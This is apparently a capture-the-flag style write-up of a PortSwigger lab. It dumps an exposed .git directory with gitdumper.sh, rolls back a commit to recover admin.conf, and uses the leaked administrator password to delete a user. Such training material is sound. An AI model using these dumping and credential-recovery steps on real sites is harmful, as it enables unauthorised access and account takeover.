# Information Disclosure via Version Control History

This lab leaks sensitive data through its exposed version control history.

**Goal:** Recover the administrator's password, log in, and delete Carlos's account.

---

**Reference:** https://portswigger.net/web-security/information-disclosure/exploiting

<img width="662" height="326" alt="1" src="https://github.com/user-attachments/assets/181df68b-af8b-4a7d-9336-dcb679f059d2" />


---

Lab URL generated: https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/

A `.git/` directory is accessible and allows directory listing:

<img width="746" height="425" alt="2" src="https://github.com/user-attachments/assets/3a9fa791-91a8-4eac-9db6-5636b391e15d" />


The gitdumper script (https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh) was downloaded and used to pull down the exposed `.git` repository:

```
bash gitdumper.sh https://0afa00c404fb4d8581880c60002e004e.web-security-academy.net/.git/ /tmp/a/
```

<img width="818" height="532" alt="3" src="https://github.com/user-attachments/assets/7009e04d-8e9c-4e92-9640-9e366bb2207f" />


Checking status shows sensitive files were removed in the most recent commit:

```
cd /tmp/a
git status
```

<img width="583" height="182" alt="4" src="https://github.com/user-attachments/assets/b150ce79-04c2-4ab6-9a8e-00b2d61f3cde" />


Rolling back to the prior commit and reading the file reveals its contents:

```
git log
git reset --hard d3e84943424222ce64de7da0d797b7dfdef39ea1
cat admin.conf
```

<img width="526" height="420" alt="5" src="https://github.com/user-attachments/assets/cde9d581-91f9-4c07-a005-c65f322fd5a3" />


Logging in with the recovered credentials administrator:wy0szsn75q5jqn0w70bu and deleting the target user:

<img width="678" height="173" alt="6" src="https://github.com/user-attachments/assets/fb02281b-c907-4366-85b7-025efeb51f9c" />

